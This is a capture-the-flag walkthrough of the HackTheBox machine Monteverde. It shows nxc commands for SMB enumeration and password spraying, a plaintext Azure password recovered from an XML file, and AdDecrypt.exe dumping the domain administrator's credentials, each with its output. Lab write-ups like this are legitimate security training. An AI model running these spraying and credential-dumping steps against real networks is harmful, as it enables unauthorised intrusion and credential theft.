---
title: HackTheBox-Monteverde
date: 2024-12-23 09:41:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [azure, cloud]     # TAG names should always be lowercase
image : /assets/images/EN2dAzBW4AMwIow.jpg
---

## SMB-enum

    ➜  Monteverde nxc smb 10.10.10.172
    SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)

    user : user
    ➜  Monteverde nxc smb 10.10.10.172 -u users.txt -p users.txt --no-bruteforce

    SMB        10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs

    ➜  Monteverde cat azure.xml 
    ��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
    <Obj RefId="0">
        <TN RefId="0">
        <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
        <T>System.Object</T>
        </TN>
        <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
        <Props>
        <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
        <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
        <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
        <S N="Password">4n0therD4y@n0th3r$</S>
        </Props>
    </Obj> 
    </Objs># 

## pasword-spray

    ➜  Monteverde nxc winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$'            
    WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
    WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$
    WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$
    WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)

## Azure-Part

    *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

    ======================
    AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
    Based on original code from: https://github.com/fox-it/adconnectdump
    ======================

    Opening database connection...
    Executing SQL commands...
    Closing database connection...
    Decrypting XML...
    Parsing XML...
    Finished!

    DECRYPTED CREDENTIALS:
    Username: administrator
    Password: d0m@in4dminyeah!
    Domain: MEGABANK.LOCAL

Video walkthrough
[WATCH!](https://youtu.be/H33UoqCnJb0)